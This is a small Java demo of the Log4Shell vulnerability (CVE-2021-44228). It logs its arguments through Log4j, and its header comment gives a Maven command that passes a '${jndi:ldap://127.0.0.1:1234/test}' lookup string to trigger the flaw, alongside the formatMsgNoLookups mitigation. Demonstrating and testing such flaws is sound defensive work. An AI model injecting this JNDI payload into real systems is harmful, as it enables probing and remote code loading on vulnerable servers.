package com.beehivebeach;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Simple demo of CVE-2021-44228
 * 
 * Start a listener on remote service, like:
 * 
 *   sudo tcpdump -i any tcp port 1234
 * 
 * Not OK:
 * 
 * mvn compile exec:java -Dexec.mainClass="com.beehivebeach.AppL4J2" -Dexec.args="'\${jndi:ldap://127.0.0.1:1234/test}'"
 * 
 * OK:
 * 
 * mvn compile exec:java -Dexec.mainClass="com.beehivebeach.AppL4J2" -Dexec.args="'\${jndi:ldap://127.0.0.1:1234/test}'" -Dlog4j2.formatMsgNoLookups=true
 */

public class AppL4J2 
{
    private static final Logger L = LogManager.getLogger(AppL4J2.class);
    public static void main( String[] args )
    {
        System.out.println( "Arguments AppL4J2 (" + args.length + ") :" );
        for (int i=0; i < args.length; i+=1) {
            L.info(i + ": " + args[i]);
        } 
    }
}
